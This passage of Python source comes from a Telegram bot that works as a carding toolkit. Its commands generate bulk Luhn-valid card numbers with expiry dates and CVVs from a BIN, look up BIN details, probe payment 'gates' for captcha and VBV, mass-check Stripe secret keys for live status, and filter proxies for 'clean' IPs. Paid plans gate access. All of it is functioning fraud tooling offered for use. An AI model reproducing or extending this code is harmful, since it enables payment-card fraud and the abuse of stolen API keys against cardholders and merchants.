    await notification_message.edit_text(
        f"✅ <b>URL check completed:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_urls}\n"
        f"🎉 <b>Status:</b> Completed",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    os.remove(file_path)

async def check_massgate_url(session, url):
    api_url = f"https://gatev2.onrender.com/gatev2?url={url}"
    async with session.get(api_url) as response:
        if response.status == 200:
            data = await response.json()
            return format_massgate_check_result(data, url)
        else:
            return f"⚠️ <b>Error accessing the API for URL:</b> {url}"

def format_massgate_check_result(data, url):
    site = data.get("site", "N/A")
    http_status_code = data.get("http_status_code", "Unknown")
    payment_methods = ", ".join(data.get("payment_methods", []))
    captcha = data.get("captcha", "False")
    cloudflare = data.get("cloudflare", "False")
    platform = data.get("platform", "Unknown")
    server_info = data.get("server_info", "N/A")
    auth_gate = data.get("auth_gate", False)
    vbv = data.get("vbv", False)

    return (
        f"▰▱▰▱▰▱▰▱\n\n"
        f"<b>Site:</b> <code>{site}</code>\n\n"
        f"<b>HTTP Status Code:</b> <code>{http_status_code}</code>\n"
        f"✦─ ─ ─ ─ ✦✦ ─ ─ ─ ─✦\n"
        f"<b>Payment Methods:</b> <code>{payment_methods}</code>\n\n"
        f"<b>Captcha:</b> <code>{captcha}</code>\n"
        f"<b>Cloudflare:</b> <code>{cloudflare}</code>\n\n"
        f"✦─ ─ ─ ─ ✦✦ ─ ─ ─ ─✦\n"
        f"<b>Platform:</b> <code>{platform}</code>\n"
        f"<b>Server Info:</b> <code>{server_info}</code>\n\n"
        f"<b>Auth Gate:</b> <code>{auth_gate}</code>\n"
        f"<b>VBV:</b> <code>{vbv}</code>\n\n"
        f"▰▱▰▱▰▱▰▱\n"
    )

#-----------------------------------
#gen part
def generate_ccn(extrap: str):
    result = ""
    cl = 15 if extrap.startswith(("34", "37")) else 16
    for char in extrap:
        if char == 'x' or char == 'X':
            result += str(random.randint(0, 9))
        else:
            result += char
    while len(result) < cl:
        result += str(random.randint(0, 9))
    return result[:cl]

def luhn2(ccn: str):
    d = [int(d) for d in str(ccn)]
    od = d[-1::-2]
    ed = d[-2::-2]
    checksum = sum(od) + sum(digit if (digit := d * 2) < 10 else digit - 9 for d in ed)
    return checksum % 10 == 0

def voidgen(extrap: str):
    ext = extrap.replace('\\', '|').replace('/', '|').replace(':', '|').replace(' ', '|')
    lines = ext.split("|")
    if not lines[0][:2].isdigit():
        raise Exception("VoidGen.Error: Invalid Extrap Provided")

    ccn = generate_ccn(lines[0])
    current_year = datetime.now().year
    current_month = datetime.now().month
    mes = str(random.randint(1, 12)).zfill(2)
    ano = str(random.randint(current_year, 2040))
    cvv = str(random.randint(1111, 9999)) if extrap.startswith(("34", "37")) else str(random.randint(111, 999))
    
    if len(lines) >= 2:
        if "/" in lines[1]:
            mes, ano = lines[1].split("/")
        elif lines[1].isdigit():
            mes = lines[1].zfill(2)
    if len(lines) >= 3 and lines[2].isdigit():
        ano = lines[2]
    if len(lines) >= 4 and lines[3].isdigit():
        cvv = lines[3]
    
    if int(ano) == current_year and int(mes) < current_month:
        mes = str(random.randint(current_month, 12)).zfill(2)
    if int(mes) > 12:
        mes = str(random.randint(1, 12)).zfill(2)
    
    return ccn, mes, ano, cvv

@app.on_message(command_with_mention("gen"))
@universal_handler
@requires_auth
@requires_plan
@anti_spam
async def gen_cc(client, message, user_info, *args, **kwargs):
    try:
        start_time = time.time()
        message_text = message.text.strip()
        inputs = message_text.split(maxsplit=2)[1:]

        if len(inputs) >= 1:
            extrap = inputs[0].replace(' ', '|')
            limit = int(inputs[1]) if len(inputs) > 1 else 5

            if limit > 50000:
                await message.reply("⚠️ <b>The maximum number of generated CCs allowed is 50,000.</b>", parse_mode=enums.ParseMode.HTML)
                return

            # Xử lý ngày hết hạn và CVV
            exp_cvv = inputs[2] if len(inputs) > 2 else ""
            exp_parts = exp_cvv.split()

            if len(exp_parts) == 2:
                month = exp_parts[0].zfill(2)
                year = exp_parts[1].zfill(4)
                cvv = '0000'
            elif len(exp_parts) == 3:
                month = exp_parts[0].zfill(2)
                year = exp_parts[1].zfill(4)
                cvv = exp_parts[2]
            else:
                month = str(random.randint(1, 12)).zfill(2)
                year = '2040'
                cvv = '0000'

            # Xác minh định dạng BIN
            bin_match = re.search(r'\d{6}', extrap)
            if not bin_match:
                await message.reply('⚠️ <b>Invalid BIN format. Please provide a valid BIN.</b>', parse_mode=enums.ParseMode.HTML)
                return

            bin_num = bin_match.group()

            api_url = f"https://bins.antipublic.cc/bins/{bin_num}"
            api_response = requests.get(api_url)

            if api_response.status_code != 200:
                await message.reply('⚠️ <b>Failed to retrieve BIN information.</b>', parse_mode=enums.ParseMode.HTML)
                return

            bin_data = api_response.json()
            brand = (bin_data.get('brand') or 'N/A').upper()
            bin_type = (bin_data.get('type') or 'N/A').upper()
            level = (bin_data.get('level') or 'N/A').upper()
            country_flag = bin_data.get('country_flag', '🌍')
            bank_info = (bin_data.get('bank') or 'N/A').upper()
            country_name = (bin_data.get('country_name') or 'N/A').upper()

            g = 0
            l = set()
            while limit > g:
                ccn, mes, ano, cvv = voidgen(extrap)
                if luhn2(ccn) and ccn not in l:
                    l.add(f"{ccn}|{mes}|{ano}|{cvv}")
                    g += 1

            bin_info = (
                f"𝗜𝗻𝗳𝗼: <b>{brand} - {bin_type} - {level}</b>\n"
                f"𝗕𝗮𝗻𝗸: <b>{bank_info}</b>\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <b>{country_name} {country_flag}</b>\n"
                f"━━━━━━━━⊛"
            )

            if limit <= 5:
                result_text = "\n".join([f"<code>{cc}</code>" for cc in l])
                format_text = (
                    f"<b>▰ <b>Generator</b> | [🎪]</b>\n\n"
                    f"{bin_info}\n"
                    f"{result_text}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"♧| <b>Format:</b> <code>{extrap}</code>\n"
                    f"♧| <b>Amount: {limit}</b>\n"
                    f"♧| <b>Time taken: {round((time.time() - start_time) * 1000)}ms</b>"
                )
                await message.reply(format_text, parse_mode=enums.ParseMode.HTML)
            else:
                bin_number = extrap[:6]
                file_name = f"gen_{bin_number}xxx_{limit}@{user_info['username']}.txt"
                with open(file_name, 'w') as file:
                    for cc in l:
                        file.write(cc + "\n")
                caption_text = (
                    f"<b>▰ <b>Generator</b> | [💈]</b>\n\n"
                    f"{bin_info}\n"
                    f"♧| <b>Format:</b> <code>{extrap}</code>\n"
                    f"♧| <b>Amount: {limit}</b>\n"
                    f"♧| <b>Time taken: {round((time.time() - start_time) * 1000)}ms</b>"
                )
                await client.send_document(message.chat.id, file_name, caption=caption_text, parse_mode=enums.ParseMode.HTML)
                os.remove(file_name)
        else:
            await message.reply("🎲<b>Please input correct format:\n( /gen {cc|month|year|ccv} {amount} ) </b>", parse_mode=enums.ParseMode.HTML)

    except Exception as e:
        await message.reply(f"💀<b>Uhh! Got an ERROR :</b> <code>{e}</code>\n\n🔧<b>Contact owner to fix :</b> @lisa_is_me", parse_mode=enums.ParseMode.HTML)

#-----------------------------------
currency_symbols = {
    "AED": "د.إ", "AFN": "؋", "ALL": "L", "AMD": "֏", "ANG": "ƒ", "AOA": "Kz", "ARS": "$", "AUD": "A$", "AWG": "ƒ",
    "AZN": "₼", "BAM": "KM", "BBD": "Bds$", "BDT": "৳", "BGN": "лв", "BHD": ".د.ب", "BIF": "FBu", "BMD": "BD$",
    "BND": "B$", "BOB": "Bs.", "BRL": "R$", "BSD": "B$", "BTN": "Nu.", "BWP": "P", "BYN": "Br", "BZD": "BZ$",
    "CAD": "C$", "CDF": "FC", "CHF": "Fr.", "CLP": "CLP$", "CNY": "¥", "COP": "COL$", "CRC": "₡", "CUP": "CUP$",
    "CVE": "Esc", "CZK": "Kč", "DJF": "Fdj", "DKK": "kr", "DOP": "RD$", "DZD": "دج", "EGP": "E£", "ERN": "Nfk",
    "ETB": "Br", "EUR": "€", "FJD": "FJ$", "FKP": "FK£", "GBP": "£", "GEL": "₾", "GHS": "GH₵", "GIP": "£", "GMD": "D",
    "GNF": "FG", "GTQ": "Q", "GYD": "GY$", "HKD": "HK$", "HNL": "L", "HRK": "kn", "HTG": "G", "HUF": "Ft", "IDR": "Rp",
    "ILS": "₪", "INR": "₹", "IQD": "ع.د", "IRR": "﷼", "ISK": "kr", "JMD": "J$", "JOD": "د.ا", "JPY": "¥", "KES": "KSh",
    "KGS": "с", "KHR": "៛", "KID": "KD$", "KRW": "₩", "KWD": "د.ك", "KZT": "₸", "LAK": "₭", "LBP": "ل.ل", "LKR": "Rs",
    "LRD": "LD$", "LSL": "M", "LYD": "ل.د", "MAD": "د.م.", "MDL": "L", "MGA": "Ar", "MKD": "ден", "MMK": "Ks",
    "MNT": "₮", "MOP": "MOP$", "MRU": "UM", "MUR": "Rs", "MVR": "Rf", "MWK": "MK", "MXN": "Mex$", "MYR": "RM",
    "MZN": "MTn", "NAD": "N$", "NGN": "₦", "NIO": "C$", "NOK": "kr", "NPR": "नेरू", "NZD": "NZ$", "OMR": "﷼",
    "PAB": "B/.", "PEN": "S/.", "PGK": "K", "PHP": "₱", "PKR": "Rs", "PLN": "zł", "PYG": "₲", "QAR": "﷼", "RON": "L",
    "RSD": "дин", "RUB": "₽", "RWF": "RF", "SAR": "﷼", "SBD": "SI$", "SCR": "SR", "SDG": "ج.س.", "SEK": "kr", "SGD": "S$",
    "SHP": "£", "SLL": "Le", "SOS": "Sh", "SRD": "SR$", "SSP": "£", "STN": "Db", "SYP": "ل.س", "SZL": "E", "THB": "฿",
    "TJS": "ЅМ", "TMT": "T", "TND": "د.ت", "TOP": "T$", "TRY": "₺", "TTD": "TT$", "TWD": "NT$", "TZS": "TSh", "UAH": "₴",
    "UGX": "USh", "USD": "$", "UYU": "$U", "UZS": "UZS", "VEF": "Bs", "VND": "₫", "VUV": "VT", "WST": "WS$", "XAF": "FCFA",
    "XCD": "EC$", "XOF": "CFA", "XPF": "₣", "YER": "﷼", "ZAR": "R", "ZMW": "ZK", "ZWL": "Z$"
}

@app.on_message(command_with_mention("bin"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def get_bin_info(client, message, user_info, *args, **kwargs):
    try:
        message_text = message.text
        bin_match = re.search(r'\d{6}', message_text)
        if bin_match:
            bin_num = bin_match.group()
            start_time = time.time()

            api_url = f"https://bins.antipublic.cc/bins/{bin_num}"
            api_response = requests.get(api_url)

            if api_response.status_code == 200:
                bin_data = api_response.json()

                brand = bin_data.get('brand', 'N/A').upper() if bin_data.get('brand') else 'N/A'
                bin_type = bin_data.get('type', 'N/A').upper() if bin_data.get('type') else 'N/A'
                level = bin_data.get('level', 'N/A').upper() if bin_data.get('level') else 'N/A'
                country_currencies = bin_data.get('country_currencies', ['N/A'])
                country_flag = bin_data.get('country_flag', '🌍')
                bank_info = bin_data.get('bank', 'N/A').upper() if bin_data.get('bank') else 'N/A'
                country_name = bin_data.get('country_name', 'N/A').upper() if bin_data.get('country_name') else 'N/A'

                currency_symbols_text = ', '.join(
                    [f"{currency} ({currency_symbols.get(currency, currency)})" for currency in country_currencies])

                bin_info = "▐ 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅️ ▐\n\n"
                bin_info += f"𝗕𝗜𝗡 ⇾ <b><code>{bin_num}</code></b>\n\n"
                bin_info += f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <b><code>{brand}</code> - <code>{bin_type}</code> - <code>{level}</code></b>\n"
                bin_info += f"𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: <b><code>{currency_symbols_text}</code></b>\n"
                bin_info += f"𝗕𝗮𝗻𝗸: <b><code>{bank_info}</code></b>\n"
                bin_info += f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <b><code>{country_name} {country_flag}</code></b>\n"
                time_taken = round(time.time() - start_time, 2)
                bin_info += f"\n𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ➠ <b><code>{time_taken}'s</code></b>"

                await message.reply(bin_info, parse_mode=enums.ParseMode.HTML)
            else:
                await message.reply("FAILED TO RETRIEVE BIN INFORMATION.")
        else:
            await message.reply("No 6-digit bin number found in the message.")
    except Exception as e:
        await message.reply(f"💀Uhh! Got an ERROR : {str(e)}\n\n🔧Contact owner to fix : @lisa_is_me")
@app.on_message(command_with_mention("sk"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def check_sk_key(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/sk &lt;your_sk_key&gt;</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : SK Checker 🌕\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    sk_key = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/sk?sk={sk_key}"
    
    processing_message = await message.reply('<b>Checking SK key...</b>', parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("Status", "Unknown")
                sk = data.get("Sk", sk_key)
                username = user_info.get('username', '')

                reply_message = f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ <b>{status}</b>\n˖ ❀ ˚▬▬- - - - -- - - - -▬▬୨୧ ˚\n𝙎𝙠 ⌁ <code>{sk}</code>\n\n"

                if 'Name' in data:
                    reply_message += f"𝙉𝙖𝙢𝙚 - <b>{data['Name']}</b>\n"
                if 'Site Url' in data:
                    reply_message += f"𝙎𝙞𝙩𝙚 - <b>{data['Site Url']}</b>\n"
                if 'Account Id' in data:
                    reply_message += f"𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙙 - <code>{data['Account Id']}</code>\n"
                if 'Country' in data:
                    reply_message += f"𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{data['Country']}</b>\n"
                if 'Currency' in data:
                    reply_message += f"𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮 - <code>{data['Currency']}</code>\n"
                if 'Email' in data:
                    reply_message += f"𝙈𝙖𝙞𝙡 - <b>{data['Email']}</b>\n"
                if 'Available Balance' in data:
                    reply_message += f"𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘽𝙖𝙡𝙖𝙣𝙘𝙚 ➜ <b>{data['Available Balance']}</b>\n"
                if 'Pending Balance' in data:
                    reply_message += f"𝙋𝙚𝙣𝙙𝙞𝙣𝙜 ➜ <b>{data['Pending Balance']}</b>\n"
                if 'Payment Method Status' in data:
                    reply_message += f"• 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙈𝙚𝙩𝙝𝙤𝙙 𝙎𝙩𝙖𝙩𝙪𝙨 - <b>{data['Payment Method Status']}</b>\n"
                if 'Account Status' in data:
                    reply_message += f"• 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙎𝙩𝙖𝙩𝙪𝙨 - <b>{data['Account Status']}</b>\n"
                if 'Charges Enabled' in data:
                    reply_message += f"• 𝘾𝙝𝙖𝙧𝙜𝙚𝙨 𝙀𝙣𝙖𝙗𝙡𝙚𝙙 - <b>{data['Charges Enabled']}</b>\n"
                if 'Capabilities' in data:
                    reply_message += f"-»𝘾𝙖𝙥𝙖𝙗𝙞𝙡𝙞𝙩𝙞𝙚𝙨:\n<code>{data['Capabilities']}</code>\n"

                reply_message += (
                    f" - - - - - - - - - - - - - - - - - -\n"
                    f"𝗧𝗶𝗺𝗲 ➜ <b>{elapsed_seconds}</b>\n"
                    f"𝗥𝗲𝗾 𝗯𝘆 ➜ <b>{username} [{plan}]</b>\n"
                    f"・⌁▰▱▰▱⌁・"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error checking SK key:</b> <code>{e}</code>', parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)
            
#mass sk

@app.on_message(command_with_mention("msk"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def check_sk_key(client, message, user_info, *args, **kwargs):
    start_time = time.time()
    if message.reply_to_message and message.reply_to_message.document:
        try:
            await message.reply_text("Processing SK keys from file...", quote=True)
            file_id = message.reply_to_message.document.file_id
            file = await client.download_media(file_id)
            with open(file, 'r') as f:
                sk_keys = [line.strip() for line in f]
        except Exception as e:
            await message.reply_text(f"Error downloading or reading the file: {e}", quote=True)
            return

        live_keys = []
        rate_limited_keys = []
        dead_count = 0
        total_keys = len(sk_keys)
        processed_count = 0

        progress_message = await message.reply_text(f"Processing SK keys... 0/{total_keys}", quote=True)

        for sk_key in sk_keys:
            result, status = await check_single_sk(sk_key)
            if status == "✅ Live":
                live_keys.append(sk_key)
            elif status == "⚠️ Rate Limited":
                rate_limited_keys.append(sk_key)
            else:
                dead_count += 1
            processed_count += 1
            await progress_message.edit_text(f"Processing SK keys... {processed_count}/{total_keys}")

        await progress_message.edit_text(generate_summary_with_keys(start_time, user_info, live_keys, rate_limited_keys, dead_count, total_keys))

    else:
        await message.reply('Please reply to a file containing SK keys.', quote=True)


async def check_single_sk(sk_key):
    api_url = f"https://gatev2.onrender.com/sk?sk={sk_key}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    status = data.get("Status", "Unknown")
                    if "✅" in status or "Live" in status:
                        return sk_key, "✅ Live"
                    elif "⚠️" in status or "Rate Limited" in status:
                        return sk_key, "⚠️ Rate Limited"
                    elif "❌" in status or "Dead" in status:
                        return sk_key, "❌ Dead"
                    else:
                        return sk_key, "❌ Dead"
                else:
                    return sk_key, f"❌ Error: {response.status}"
        except asyncio.TimeoutError:
            return sk_key, "⚠️ Timeout"
        except aiohttp.ClientError as e:
            return sk_key, f"❌ Error: {e}"
        except json.JSONDecodeError:
            return sk_key, "❌ Invalid JSON response"
        except Exception as e:
            return sk_key, f"❌ Unexpected error: {e}"



def generate_summary_with_keys(start_time, user_info, live_keys, rate_limited_keys, dead_count, total_keys):
    summary = f"SK Checker Results\n"
    summary += f"Total SKs Checked: {total_keys}\n"
    summary += f"✅ Live: {len(live_keys)}\n"
    if live_keys:
        summary += "Live SKs:\n"
        summary += "\n".join(live_keys) + "\n"
    summary += f"⚠️ Rate Limited: {len(rate_limited_keys)}\n"
    if rate_limited_keys:
        summary += "Rate Limited SKs:\n"
        summary += "\n".join(rate_limited_keys) + "\n"
    summary += f"❌ Dead: {dead_count}\n"
    summary += f" - - - - - - - - - - - - - - - - - -\n"
    summary += f"Time ➜ {(time.time() - start_time):.2f} seconds\n"
    summary += f"Req by ➜ {user_info.get('username', '')} [{user_info.get('plan', 'Free')}]\n"
    summary += "・⌁▰▱▰▱⌁・"
    return summary
            
            
#proxy check            

           

@app.on_message(command_with_mention("ip"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def check_proxies(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_proxies(client, message, user_info, *args, **kwargs))

async def process_proxies(client, message, user_info, *args, **kwargs):
    if message.reply_to_message and message.reply_to_message.document:
        # Replying to a file
        file_path = await message.reply_to_message.download()
        with open(file_path, 'r') as file:
            proxies_input = file.readlines()
        os.remove(file_path)  # Delete the file after reading
    else:
        # Direct input in the text message
        message_text = message.text.split(maxsplit=1)
        if len(message_text) < 2:
            await message.reply("⚠️ **Usage:** /ip <proxy1> <proxy2> ... or reply to a txt file with proxies.", parse_mode=enums.ParseMode.HTML)
            return
        proxies_input = message_text[1].replace(',', ' ').replace('\n', ' ').split()

    proxies = [proxy.strip() for proxy in proxies_input if proxy.strip()]
    
    if not proxies:
        await message.reply("⚠️ **No valid proxies found. Please provide one or more proxies.**", parse_mode=enums.ParseMode.HTML)
        return

    if message.reply_to_message and message.reply_to_message.document:
        # Process proxies from the file
        live_proxies, live_proxies_info = await check_proxies_from_file(proxies)
        
        if live_proxies:
            with open("live_clean_proxies.txt", "w", encoding="utf-8") as live_file:
                live_file.write("\n".join(live_proxies))
            with open("live_proxies_info.txt", "w", encoding="utf-8") as info_file:
                info_file.write("\n\n".join(live_proxies_info))
            
            await client.send_document(message.chat.id, "live_clean_proxies.txt")
            await client.send_document(message.chat.id, "live_proxies_info.txt")
            
            os.remove("live_clean_proxies.txt")
            os.remove("live_proxies_info.txt")
        
        await message.reply(f"✅ File processing complete! {len(live_proxies)} live proxies found.")
    else:
        # Process proxies directly from the message
        live_proxies_info = []
        live_proxies = []

        checking_message = await message.reply("Checking proxies...")

        tasks = [check_proxy(proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if result and not isinstance(result, Exception):
                live_proxies_info.append(result['info'])
                live_proxies.append(result['proxy'])

        if live_proxies_info:
            await message.reply(f"Live Proxies:\n\n" + "\n".join(live_proxies))
            await message.reply("\n\n".join(live_proxies_info))

        await checking_message.delete()

async def check_proxies_from_file(proxies):
    tasks = [check_proxy_clean(proxy) for proxy in proxies]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    live_proxies = [result['proxy'] for result in results if result]
    live_proxies_info = [result['info'] for result in results if result]
    return live_proxies, live_proxies_info

async def check_proxy(proxy):
    proxy_parts = proxy.split(':')
    if len(proxy_parts) < 2:
        return None
    
    host, port = proxy_parts[0], proxy_parts[1]
    proxy_url = f"http://{host}:{port}" if len(proxy_parts) < 4 else f"http://{proxy_parts[2]}:{proxy_parts[3]}@{host}:{port}"

    try:
        conn = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get('http://ip-api.com/json/', timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    ip = data.get("query", "N/A")
                    country = data.get("country", "N/A")
                    country_code = data.get("countryCode", "").upper()
                    flag = country_flag(country_code)
                    proxy_detected = data.get("proxy", False)

                    risk_status = "Low Risk" if not proxy_detected else "High Risk - Proxy Detected"

                    info = (
                        f"Proxy: {proxy}\n"
                        f"Status: Live\n"
                        f"IP: {ip}\n"
                        f"Country: {country} {flag}\n"
                        f"Risk: {risk_status}"
                    )
                    return {"proxy": proxy, "info": info}
                else:
                    return None
    except Exception:
        return None

async def check_proxy_clean(proxy):
    proxy_parts = proxy.split(':')
    if len(proxy_parts) < 2:
        return None
    
    host, port = proxy_parts[0], proxy_parts[1]
    proxy_url = f"http://{host}:{port}" if len(proxy_parts) < 4 else f"http://{proxy_parts[2]}:{proxy_parts[3]}@{host}:{port}"

    try:
        conn = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get('http://ip-api.com/json/', timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    ip = data.get("query", "N/A")
                    country = data.get("country", "N/A")
                    proxy_detected = data.get("proxy", False)

                    if not proxy_detected:  # Clean proxies only
                        return {"proxy": proxy, "info": f"Proxy: {proxy}\nIP: {ip}\nCountry: {country}"}
                return None
    except Exception:
        return None

def country_flag(country_code):
    if len(country_code) == 2:
        return chr(127397 + ord(country_code[0])) + chr(127397 + ord(country_code[1]))
    return ''
        
        
        
            
#text to txt


@app.on_message(command_with_mention("text"))
@requires_auth
@requires_plan
async def text_to_file(client, message, *args, **kwargs):
    asyncio.create_task(process_text_to_file(client, message, *args, **kwargs))

async def process_text_to_file(client, message, *args, **kwargs):
    timestamp = time.strftime("%d-%m-%Y_%H-%M-%S", time.localtime())

    if message.reply_to_message and message.reply_to_message.text:
        text_content = message.reply_to_message.text
    elif len(message.text.split(maxsplit=1)) > 1:
        text_content = message.text.split(maxsplit=1)[1]
    else:
        await message.reply("⚠️ Please reply to a message or provide text after the command.")
        return

    username = message.from_user.username or "anonymous"
    file_name = f"{username}_{timestamp}.txt"

    try:
        async with aiofiles.open(file_name, "w", encoding="utf-8") as text_file:
            await text_file.write(text_content)

        await client.send_document(chat_id=message.chat.id, document=file_name)

    finally:
        if os.path.exists(file_name):
            os.remove(file_name)
            

@app.on_message(command_with_mention("split"))
async def split_file(client, message, *args, **kwargs):
    try:
        if len(message.command) != 2 or not message.command[1].isdigit():
            await message.reply("⚠️ <b>Usage:</b> <code>/split [number]</code> Reply to a txt file containing CCs.", parse_mode=enums.ParseMode.HTML)
            return
        
        cc_per_file = int(message.command[1])

        if not message.reply_to_message or not message.reply_to_message.document:
            await message.reply("⚠️ Please reply to a txt file containing CCs.")
            return
        
        file_path = await message.reply_to_message.download()
        
        with open(file_path, 'r') as f:
            lines = f.readlines()

        chunks = [lines[i:i + cc_per_file] for i in range(0, len(lines), cc_per_file)]
        
        for i, chunk in enumerate(chunks, 1):
            chunk_filename = f"split_part_{i}.txt"
            with open(chunk_filename, 'w') as chunk_file:
                chunk_file.writelines(chunk)
            
            await client.send_document(message.chat.id, chunk_filename)
            os.remove(chunk_filename)
        
        os.remove(file_path)
        
        await message.reply(f"✅ Split complete! {len(chunks)} files created and sent.")
    
    except Exception as e:
        await message.reply(f"⚠️ An error occurred: {str(e)}")
        
#Mass bin check

@app.on_message(command_with_mention("mbin"))
@requires_auth
@requires_plan
@anti_spam
@universal_handler
async def get_bin_info(client, message, user_info, *args, **kwargs):
  try:
    bin_numbers = []
    # Extract BIN numbers from the message text
    for word in message.text.split():
      if re.match(r'\d{6}', word):
        bin_numbers.append(word)

    if bin_numbers:
      bin_results = []
      for bin_num in bin_numbers:
        start_time = time.time()

        api_url = f"https://bins.antipublic.cc/bins/{bin_num}"
        api_response = requests.get(api_url)

        if api_response.status_code == 200:
          bin_data = api_response.json()

          brand = bin_data.get('brand', 'N/A').upper() if bin_data.get('brand') else 'N/A'
          bin_type = bin_data.get('type', 'N/A').upper() if bin_data.get('type') else 'N/A'
          level = bin_data.get('level', 'N/A').upper() if bin_data.get('level') else 'N/A'
          country_currencies = bin_data.get('country_currencies', ['N/A'])
          country_flag = bin_data.get('country_flag', '🌍')
          bank_info = bin_data.get('bank', 'N/A').upper() if bin_data.get('bank') else 'N/A'
          country_name = bin_data.get('country_name', 'N/A').upper() if bin_data.get('country_name') else 'N/A'

          currency_symbols_text = ', '.join(
            [f"{currency} ({currency_symbols.get(currency, currency)})" for currency in country_currencies])

          bin_info = "▐ 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅️ ▐\n\n"
          bin_info += f"𝗕𝗜𝗡 ⇾ {bin_num}\n\n"
          bin_info += f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n"
          bin_info += f"𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: {currency_symbols_text}\n"
          bin_info += f"𝗕𝗮𝗻𝗸: {bank_info}\n"
          bin_info += f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {country_flag}\n"
          time_taken = round(time.time() - start_time, 2)
          bin_info += f"\n𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ➠ {time_taken}'s"

          bin_results.append(bin_info)
        else:
          bin_results.append(f"FAILED TO RETRIEVE BIN INFORMATION FOR {bin_num}")

      # Combine all the bin results into a single message
      combined_results = "\n\n".join(bin_results)
      await message.reply(combined_results, parse_mode=enums.ParseMode.HTML)
    else:
      await message.reply("No valid 6-digit BIN numbers found in the message.")
  except Exception as e:
    await message.reply(f"💀Uhh! Got an ERROR : {str(e)}\n\n🔧Contact owner to fix : @lisa_is_me")
    
#Tool Genbin

@app.on_message(command_with_mention("genbin"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, args, *kwargs):
    message_text = message.text.split()
    if len(message_text) != 3:
        await message.reply('Usage: /genbin Brand Amount (e.g., /genbin visa 1)', parse_mode=enums.ParseMode.HTML)
        return

    brand = message_text[1].lower()
    try:
        amount = int(message_text[2])
    except ValueError:
        await message.reply('Amount must be an integer.', parse_mode=enums.ParseMode.HTML)
        return

    if amount > 10:
        await message.reply('Amount cannot be greater than 10.', parse_mode=enums.ParseMode.HTML)
        return

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/genbin?brand={brand}&amount={amount}"
    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E") #Replace with your sticker ID
    processing_message = await message.reply('Processing...', parse_mode=enums.ParseMode.HTML)

    try:
        api_response = await fetch_api_data(api_url)

        if api_response is None:
            reply_message = "API request failed. Please try again later."
        elif isinstance(api_response, str) and "error" in api_response.lower():
            reply_message = f"API Error: {api_response}"
        elif isinstance(api_response, list) and all(isinstance(bin_num, str) for bin_num in api_response):
            bins = " ".join(api_response)
            reply_message = format_reply(bins, message.from_user.username, user_info, start_time)
        elif isinstance(api_response, str):
            reply_message = format_reply(api_response, message.from_user.username, user_info, start_time)
        else:
            reply_message = "An unexpected error occurred. The API returned an invalid response."

    except asyncio.TimeoutError:
        reply_message = "API request timed out. Please try again later."
    except Exception as e:
        reply_message = f"An error occurred: {e}"

    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


def format_reply(bins, username, user_info, start_time):
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"
    return (
        f"BINS [ /genbin ]\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"BINS ➜ {bins}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
